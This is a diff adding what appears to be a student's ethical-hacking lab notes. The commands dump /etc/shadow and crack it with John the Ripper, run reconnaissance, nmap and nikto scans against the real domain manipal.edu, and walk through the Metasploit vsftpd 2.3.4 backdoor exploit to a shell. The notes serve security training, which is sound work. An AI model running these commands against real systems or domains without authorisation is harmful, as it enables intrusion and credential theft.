@@ -1,0 +1,72 @@
+Pass cracking:
+sudo cat /etc/passwd>passwd.txt     
+sudo cat /etc/shadow>hash2.txt                          
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/eh]
+└─$ sudo unshadow passwd.txt hash2.txt > combined.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/eh]
+└─$ sudo john --format=crypt --wordlist=rockyou.txt combined.txt
+
+
+Information gathering:
+
+Passive Reconiassance:
+
+whois manipal.edu
+
+dig manipal.edu
+dig manipal.edu TXT
+dig manipal.edu NS
+nslookup manipal.edu
+theHarvester -d manipal.edu -b yahoo -l 100 ---->Gathers information from public sources.
+sublist3r -d manipal.edu --->gives subdomain info
+
+Active Reconiassance:
+
+ping -c 4 manipal.edu
+
+sudo arp-scan --localnet --->Identifies devices connected to the same local network.
+
+traceroute manipal.edu --->Displays the network hops taken by packets to reach the destination.
+
+curl -I manipal.edu --->Displays HTTP response headers.
+
+curl -v manipal.edu ---->Displays detailed connection and HTTP communication information.
+
+
+Nmap and Enumeration:
+ping -c 4 target_ip in kali, in Metasploit ping -c 4 kali_ip
+nmap -sV -sT -O target_ip
+map -sV -sT -O -oA nmap.txt 192.168.33.131 --->oA used to store nmap result in filename called nmap.txt
+
+
+Vuln Scanning:
+nmap --script vuln target_ip
+nmap --script -sV vuln target_ip -->vuln runs applicable vulnerability detection scripts
+nmap --script -sV vulners target_ip -->vulners checks detected software versions against vulnerability information.
+
+nikto -h http://manipal.edu --->web vuln scanner
+
+searchsploit vsftpd 2.3.4 ---> User for searching vuln application;  vsftpd 2.3.4 is version of ftp
+
+
+Exploitation:
+ifconfig in both kali and target_ip
+ping -c 4 ipaddr_meta
+ping -c 4 ipaddr_kali
+
+in kali:
+msfconsole
+search vsftpd 2.3.4 ---> search open port-->here ftp port we took
+use exploit/unix/ftp/vsftpd_234_backdoor ----->this path we got from prev search --->In this we'll get to what are all things, we can use it and exploit it
+show options
+set RHOSTS target_ip
+set LHOST kali_ip
+run
+
+gottt exploitedddd!!!!!!!
+whoami ---->if you dont get any output
+shell --> do this and whoami
+
+
